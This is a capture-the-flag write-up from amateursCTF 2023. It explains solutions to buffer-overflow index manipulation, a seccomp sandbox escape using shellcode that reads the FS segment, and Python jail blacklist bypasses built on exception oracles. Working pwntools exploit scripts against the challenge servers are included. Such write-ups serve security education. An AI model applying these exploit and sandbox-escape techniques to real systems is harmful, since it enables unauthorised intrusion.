---
weight: 1
title: "amateursCTF 2023 Writeups"
date: 2023-07-24T02:05:00+07:00
lastmod: 2023-07-24T02:05:00+07:00
draft: false
author: "ItayB"
authorLink: "https://itaybel.github.io"
description: "Solutions to some of the pwn/misc challenges in the event."

tags: ["pwn", "amateursCTF", "misc", "pyjail", "sandbox"]
categories: ["Writeups"]

lightgallery: true

toc:
  enable: true
---

Solutions to some of the pwn/misc challenges in the event.
<!--more-->

## Overview

In this CTF, I have played with `thehackerscrew`, and we finished 6th place! Here are our solves:

![Alt text](image.png)

As u can see. we were kinda short on web chals. not many web folks were active. but we still managed to finish a lot of chals. I have solved these chals:

```
algo/gcd-query-v1
forensics/rules-iceberg
misc/Censorship
misc/Censorship Lite
misc/q-warmup
misc/Insanity check
misc/Censorship Lite++
pwn/rntk
pwn/permissions
pwn/hex-converter
pwn/hex-converter-2
pwn/i-love-ffi
pwn/ELFcrafting-v1
pwn/simple-heap-v1
pwn/perfect-sandbox
pwn/ELFcrafting-v2
```
## Pwn/Hex-Converter1
This was a pretty easy pwn challenge with 138 solves during the CTF.

here is the source code:
```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    int i = 0;

    char name[16];
    printf("input text to convert to hex: \n");
    gets(name);

    char flag[64];
    fgets(flag, 64, fopen("flag.txt", "r"));
    // TODO: PRINT FLAG for cool people ... but maybe later

    while (i < 16)
    {
        // the & 0xFF... is to do some typecasting and make sure only two characters are printed ^_^ hehe
        printf("%02X", (unsigned int)(name[i] & 0xFF));
        i++;
    }
    printf("\n");
}
```

Pretty straightforward. it will take our name, and convert it to hex.

it will also store the `flag` variable on the stack.

Input is taken using the `gets` function, which is known as an unsafe function, which leads to buffer overflow.

Best thing to do when solving pwn chals, is to use GDB. lets run gdb with the 
challenge binary, and disassemble main:

```
pwndbg> disassemble main
Dump of assembler code for function main:
   0x0000000000401186 <+0>:	push   rbp
   0x0000000000401187 <+1>:	mov    rbp,rsp
   0x000000000040118a <+4>:	sub    rsp,0x60
   0x000000000040118e <+8>:	mov    rax,QWORD PTR [rip+0x2eab]        # 0x404040 <stdout@GLIBC_2.2.5>
   0x0000000000401195 <+15>:	mov    esi,0x0
   0x000000000040119a <+20>:	mov    rdi,rax
   0x000000000040119d <+23>:	call   0x401050 <setbuf@plt>
   0x00000000004011a2 <+28>:	mov    rax,QWORD PTR [rip+0x2eb7]        # 0x404060 <stderr@GLIBC_2.2.5>
   0x00000000004011a9 <+35>:	mov    esi,0x0
   0x00000000004011ae <+40>:	mov    rdi,rax
   0x00000000004011b1 <+43>:	call   0x401050 <setbuf@plt>
   0x00000000004011b6 <+48>:	mov    DWORD PTR [rbp-0x4],0x0
   0x00000000004011bd <+55>:	mov    edi,0x402010
   0x00000000004011c2 <+60>:	call   0x401040 <puts@plt>
   0x00000000004011c7 <+65>:	lea    rax,[rbp-0x20]
   0x00000000004011cb <+69>:	mov    rdi,rax
   0x00000000004011ce <+72>:	mov    eax,0x0
   0x00000000004011d3 <+77>:	call   0x401080 <gets@plt>
   0x00000000004011d8 <+82>:	mov    esi,0x40202f
   0x00000000004011dd <+87>:	mov    edi,0x402031
   0x00000000004011e2 <+92>:	call   0x401090 <fopen@plt>
   0x00000000004011e7 <+97>:	mov    rdx,rax
   0x00000000004011ea <+100>:	lea    rax,[rbp-0x60]
   0x00000000004011ee <+104>:	mov    esi,0x40
   0x00000000004011f3 <+109>:	mov    rdi,rax
   0x00000000004011f6 <+112>:	call   0x401070 <fgets@plt>
   0x00000000004011fb <+117>:	jmp    0x401222 <main+156>
   0x00000000004011fd <+119>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000401200 <+122>:	cdqe   
   0x0000000000401202 <+124>:	movzx  eax,BYTE PTR [rbp+rax*1-0x20]
   0x0000000000401207 <+129>:	movsx  eax,al
   0x000000000040120a <+132>:	movzx  eax,al
   0x000000000040120d <+135>:	mov    esi,eax
   0x000000000040120f <+137>:	mov    edi,0x40203a
   0x0000000000401214 <+142>:	mov    eax,0x0
   0x0000000000401219 <+147>:	call   0x401060 <printf@plt>
   0x000000000040121e <+152>:	add    DWORD PTR [rbp-0x4],0x1
   0x0000000000401222 <+156>:	cmp    DWORD PTR [rbp-0x4],0xf
   0x0000000000401226 <+160>:	jle    0x4011fd <main+119>
   0x0000000000401228 <+162>:	mov    edi,0xa
   0x000000000040122d <+167>:	call   0x401030 <putchar@plt>
   0x0000000000401232 <+172>:	mov    eax,0x0
   0x0000000000401237 <+177>:	leave  
   0x0000000000401238 <+178>:	ret    
End of assembler dump.
pwndbg> 
```
We can understand a few things from this code.

First of all, RBP is a register that points to the stack base address, and each local variable is stored in a constant offset from it.
Lets try to understand where each local variable is stored.

In line `main+65`, we can see that the code set `rax` to be `rbp-0x20`, then it is moved to `rdi`, and `gets` is called.

The calling convention is 64bit is to use registers to pass arguments to functions. RDI is used for the first argument, RSI for the second, etc.

So, before calling to `gets`, the code moved `rbp-0x20` to `RDI`, which means that `rbp-0x20` is `gets` argument. in the c code we can see that `name` is the parameter for `gets`, so we can understand that `name` is stored in `rbp-0x20`
In line `main+156`, we can see that the assembly is comparing the value stored at `rbp-0x4` with 0xf=15. this is the condition of the while loop! so we know that `i` is stored at `rbp-0x4`.

We can also see in line `main+100`, that the code sets `rdi` to be `rbp-0x60`, and then calls to `fgets`. thats the fgets that reads the flag. so we can know that the flag is in `rbp-0x60`

The stack will look somehting like this:

![image](https://github.com/Itay212121/Weekly-CTF/assets/56035342/cedd3c85-8c71-4dbf-9197-4c9a508bb5dc)

Now, we know enough to be able to exploit this.

Using `gets(name)`, we can trigger a bufferoverflow, and override the `i` variable that is stored after name, and change it to whatever we want!

i is stored at `rbp-0x4`, name is stored at `rbp-0x20`, so we need `0x20-0x4=28` bytes to reach it. 

Now, what should we change it to?
When printing `name` to us, it uses this assembly lines to get the current character:

```
<+119>:	mov    eax,DWORD PTR [rbp-0x4]
<+124>:	movzx  eax,BYTE PTR [rbp+rax*1-0x20]
```
it takes `i`, and puts it in `eax`. then it reads `rbp-0x20+i`. to get the current character.

So in order to read the flag, which is stored in `rbp-0x60`, we need `i=-0x40` to reach it.

i is a regular int, so changing it to a negative number is possible.

Here is the final exploit:

```py
from pwn import *
p = remote('amt.rs' , 31630)

p.recvline()
p.sendline(b"A" * 28 + p32(0xffffffff - 0x40))

print(bytes.fromhex(p.recvline().decode()) )
```

Ez and fun challenge.

## Pwn/Hex-Converter2

this challenge is pretty much the same as hex1. here is the source code:
```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    int i = 0;

    char name[16];
    printf("input text to convert to hex: \n");
    gets(name);

    char flag[64];
    fgets(flag, 64, fopen("flag.txt", "r"));
    // TODO: PRINT FLAG for cool people ... but maybe later

    while (1)
    {
        // the & 0xFF... is to do some typecasting and make sure only two characters are printed ^_^ hehe
        printf("%02X", (unsigned int)(name[i] & 0xFF));

        // exit out of the loop
        if (i <= 0)
        {
            printf("\n");
            return 0;
        }
        i--;
    }
}
```
The only difference is that inside the while loop, it checks for negative i, and exits.

The stack will look exactly the same as hex1, so we can override i again.

As we can see in the while loop, it will print the `name[i]` for us, and then exit! this is good to us, because this way we can leak the flag byte by byte.

here is the exploit:

```py
from pwn import *
elf = ELF("./chal")

flag = ''
for i in range(1, 70):
	p = remote('amt.rs' , 31631)
	p.recvline()
	p.sendline(b"A" * 28 + p32(0xffffffff - 0x40 + i))
	flag += chr(int(p.recvline()[:-1].decode(), 16))
	print(flag)
	p.close()
```
## Pwn/Perfect Sandbox

perfect-sandbox was a pwn sandbox escape challenge with 49 solves. here is its source code:


```c
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <err.h>
#include <time.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <string.h>
#include <linux/seccomp.h>
#include <seccomp.h>

void setup_seccomp () {
    scmp_filter_ctx ctx;
    ctx = seccomp_init(SCMP_ACT_KILL);
    int ret = 0;
    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
    ret |= seccomp_load(ctx);
    if (ret) {
        errx(1, "seccomp failed");
    }
}

int main () {
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    char * tmp = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);

    int urandom = open("/dev/urandom", O_RDONLY);
    if (urandom < 0) {
        errx(1, "open /dev/urandom failed");
    }
    read(urandom, tmp, 4);
    close(urandom);

    unsigned int offset = *(unsigned int *)tmp & ~0xFFF;
    uint64_t addr = 0x1337000ULL + (uint64_t)offset;

    char * flag = mmap((void *)addr, 4096, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (flag == MAP_FAILED) {
        errx(1, "mapping flag failed");
    }

    int fd = open("flag.txt", O_RDONLY);
    if (fd < 0) {
        errx(1, "open flag.txt failed");
    }
    read(fd, flag, 128);
    close(fd);

    char * code = mmap(NULL, 0x100000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (code == MAP_FAILED) {
        errx(1, "mmap failed");
    }

    char * stack = mmap((void *)0x13371337000, 0x4000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_GROWSDOWN, -1, 0);
    if (stack == MAP_FAILED) {
        errx(1, "failed to map stack");
    }

    printf("> ");
    read(0, code, 0x100000);

    setup_seccomp();

    asm volatile(
        ".intel_syntax noprefix\n"
        "mov rbx, 0x13371337\n"
        "mov rcx, rbx\n"
        "mov rdx, rbx\n"
        "mov rdi, rbx\n"
        "mov rsi, rbx\n"
        "mov rsp, 0x13371337000\n"
        "mov rbp, rbx\n"
        "mov r8,  rbx\n"
        "mov r9,  rbx\n"
        "mov r10, rbx\n"
        "mov r11, rbx\n"
        "mov r12, rbx\n"
        "mov r13, rbx\n"
        "mov r14, rbx\n"
        "mov r15, rbx\n"
        "jmp rax\n"
        ".att_syntax prefix\n"
        :
        : [code] "rax" (code)
        :
    );
}
```

Lets explain the code:

Firstly, the `setup_secomp` function will be called, which limits all the syscalls our shellcode can use, to just `read`, `write`, `exit`.

first of all, a new page is created using the `mmap` function, it reads a random number to it.

Then, it will add this random number to 0x1337000ULL, and mmap a new page, which it reads the flag into.

Then, it will allocate a new memory which is executable, which our assembly will be stored at.

And lastly, it will allocate a memory for our stack, in address 0x13371337000.

Now it will read our assembly code, run this code:

```asm
    asm volatile(
        ".intel_syntax noprefix\n"
        "mov rbx, 0x13371337\n"
        "mov rcx, rbx\n"
        "mov rdx, rbx\n"
        "mov rdi, rbx\n"
        "mov rsi, rbx\n"
        "mov rsp, 0x13371337000\n"
        "mov rbp, rbx\n"
        "mov r8,  rbx\n"
        "mov r9,  rbx\n"
        "mov r10, rbx\n"
        "mov r11, rbx\n"
        "mov r12, rbx\n"
        "mov r13, rbx\n"
        "mov r14, rbx\n"
        "mov r15, rbx\n"
        "jmp rax\n"
```
and then it will run our assembly.
the challenge is not so simple, because we can't just do a open-read-write to the flag, because we can't do open. we would need to read it from the mmaped memory.

But, the problem is that all the registers are 0x13371337, so we can't do anything. but is it true?

In x86-64 there are 3 TLS entries, two of them accesible via FS and GS registers, FS is used internally by glibc (in IA32 apparently FS is used by Wine and GS by glibc).

This can give us a lot of information! lets read some bytes from it using gdb:

![image](https://github.com/Itay212121/Weekly-CTF/assets/56035342/eba6d341-7113-4038-b68a-a119152f6cd8)

We can see that at the end, in offset 0x300, there is a stack leak! this is pretty strong, because the flag address is stored in the stack.
after dumping some memory before/after this address, we can see that at this address - 0x50, there is a pointer to the flag. then we can just use the write syscall to write it.

Exploit:
```py
from pwn import *

context.arch = 'amd64'

p = remote('amt.rs', 31173)

p.recvuntil('> ')
shellcode = "mov rcx, qword ptr fs:0x300\n"
shellcode += "mov rdi, [rcx-0x50]"
shellcode += shellcraft.write(1,'rdi',100)

p.sendline(asm(shellcode))
p.interactive()
```


## Misc/Censorship and CensorshipLite


These two challenges were a pyjail escape challenges. they contain a python code that restircts the characters we can write.

Censorship:

```py
#!/usr/local/bin/python
flag = "tmp_flag"
for _ in [flag]:
    while True:
        try:
            code = ascii(input("Give code: "))
            if "flag" in code or "e" in code or "t" in code or "\\" in code:
                raise ValueError("invalid input")
            exec(eval(code))
        except Exception as err:
            print(err)

```

Censorship Lite:

```py
#!/usr/local/bin/python
flag = 'tmp_flag'
for _ in [flag]:
    while True:
        try:
            code = ascii(input("Give code: "))

            if any([i in code for i in "\lite0123456789"]):
                raise ValueError("invalid input")
            exec(eval(code))
        except Exception as err:
            print(err)
```

the solution here was really simple.
both python files print the error when an execption is caught.
I used it to my own adventage, by triggering an error which prints a variable to us.

In my solution I used the `KeyError` exception in dictioanries, and my solution was basiclly:
`{"a": "a"}[_]`

`_` will be our flag, and it'll try to reach the flag in this dictionary. this dict doesn't contian the flag, so we'll get an error like:

`KeyError: amateurCTF{..} isn't in dict`

and yeiiii ez win.

`Censorship lite++`` was a lot more harder, so read it aswell!

## Misc/CensorshipLite++

Source code:
```py
#!/usr/local/bin/python
flag = "".join([chr(i) for i in range(97, 123)] + ["{}"] + [chr(i) for i in range(65, 91)] + ["_"]) #example flag
for _ in [flag]:
    while True:
        try:
            code = ascii(input("Give code: "))
            if any([i in code for i in "lite0123456789 :< :( ): :{ }: :*\ ,-."]):
                print("invalid input")
                continue
            exec(eval(code))
        except Exception as err:
            print("zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz")
```
OK now is the big boss.

the previous two challs were really ez, since we used the exception handler.

Now, we are both limited asfuck, and it will not print the error to us.

BUT, we do know when an error occured. `zzzzz..zz` will be printed.

This is really helpful for us. we can trigger an error when some of condition is met, and we'll know if its true or not.

I used this trick to do a bruteforce byte byte on each character of the flag, and trigger an exception each time the character isn't correct.

First of all, we need numbers. its the key to win this challenge, and its not trivial because `0123456789` is restricted.

But, we can see that we can still use `=`. this is good to us, since we can just do `n='a'!='a'` and get `False`, which is equivilent to zero in python,
and `p='a'=='a'` to get one.

Then, we can change it as much as we want by doing something like `n=n+p`, which will add 1 to n each time.
Firstly, lets leak the size of the flag.

As we know, when u try to reach an outofbounds character in a string in python, an exception will be thrown.
We can use it here, and reach character in the flag until an error occured, and then we can know the length:

```py
def get_size():
	send("o='a'!='a'") #o = 0
	send("p='a'=='a'") #p = 1
	for i in range(100):
		send(f"_[o]")
		res = p.recvn(1)
		if res == b'z': #if it gave error
			return i
		send("o=o+p")
```

Now we can know the size of the flag!

But how can we know its contents? there is not really an exception we can use, since `{}` is forbidden and we can't use the same dict trick.

But, what about using the outofbounds error aswell? we can have a 1 element array, `m=['a']`.
Now, we'll brute force the character at `_[o]`, when `o` is an incrementer.

We'll iterate through each character in `chars = [chr(i) for i in range(97, 123)] + [chr(i) for i in range(65, 91)] + ["_"]`.
Then, we can use the expression `_[o] != '{c}'` to know if the current character is c or not. 
if it is `c`, it will return False, and if its not, it will return True.

But as we saw, False/True are equivilent to 0/1. we can create an array `m=['A']`. then, we can do `f"m[_[o]!='{c}']"`. if the character is not c, it will try to reach `m[1]` which will return an exception.

But if the next character is c, it will return an error to us! this way we can leak char-char the flag. Here is my code:

```py
chars = [chr(i) for i in range(97, 123)] + [chr(i) for i in range(65, 91)] + ["_"]
p = remote('amt.rs', 31672)

flag_size = 97 # get_size()

send("o='a'!='a'") #o = 0
send("p='a'=='a'") #p = 1
send("m=['A']")
flag = ""
for j in range(flag_size):
  found = False
	for c in chars:

		send(f"m[_[o]!='{c}']")
		res = p.recvn(1)
		if res == b'G': #if it didn't gave error
			flag += c
			found = True
			break
```
Look correct, right?

lets try to run it locally with
`flag = "".join([chr(i) for i in range(97, 123)] + ["{}"] + [chr(i) for i in range(65, 91)] + ["_"])`
(Which is all the possible characters for the flag)

and we'll get `abcdfghjkmnopqrsuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_`.
as u can see, all the blacklisted character aren't here. this happens because when we try to send `send(f"m[_[o]!='{c}']")` when c is blacklisted, it will continue.

We need a creative way of leaking blacklisted characters.

I have used the `>` operand to achieve that.

I created a function called `check_blacklisted`, which will take in a blacklisted charcter, and check if its the charcter at `_[o]`. I called the function like this:

```py
	if not found:
		for c in  sorted("lite{}")[::-1]: #blacklisted characters that can be in the flag
			if check_blacklisted(c):
				flag += c
				found = True
				break
		if not found:
			flag += '.'
```

My approach was simple; we can take the character before `c` in tems of ascii value, and check if its smaller than `_[o]`. we iterate through `sorted("lite{}")`, so once we find one character thats smaller then `c`, we know that c is in the flag.

```py
def check_blacklisted(c):
	low = ord(c) -1

	send(f"m[_[o]>'{chr(low)}']")
	res = p.recvn(1)

	if res == b'z': #if it gave error
		return True
	return False
```

So this way we can know each character in the flag!
This was a really interseting challenge for me, and it was a good introudction to pyjails which I always wanted to learn.

Here is the complete code:
```py
from pwn import *


def send(a):
	global p
	p.recvuntil("code: ")
	p.sendline(a)

def get_size():
	send("o='a'!='a'") #o = 0
	send("p='a'=='a'") #p = 1
	for i in range(100):
		send(f"_[o]")
		res = p.recvn(1)
		if res == b'z': #if it gave error
			return i
		send("o=o+p")

def check_blacklisted(c):
	low = ord(c) -1

	send(f"m[_[o]>'{chr(low)}']")
	res = p.recvn(1)

	if res == b'z': #if it gave error
		return True
	return False

chars = [chr(i) for i in range(97, 123)] + [chr(i) for i in range(65, 91)] + ["_"]

p = process(['python3', 'main.py'])

flag_size = get_size()

send("o='a'!='a'") #o = 0
send("p='a'=='a'") #p = 1
send("m=['A']")
flag = ""
for j in range(flag_size):
	found = False

	for c in chars:

		send(f"m[_[o]!='{c}']")
		res = p.recvn(1)
		if res == b'G': #if it didn't gave error
			print("here")
			flag += c
			found = True
			break
	if not found:
		for c in  sorted("lite{}")[::-1]: #blacklisted characters that can be in the flag
			if check_blacklisted(c):
				flag += c
				found = True
				break
		if not found:
			flag += '.'
	print(flag, j)
	send("o=o+p") #o will increament each run

```



## Appendix

Really nice challenges in this CTF. I really liked the misc.

If you have any question regarding the above solutions, you can DM me via my [Twitter](https://x.com/itaybel) or my `Discord` (itaybel).
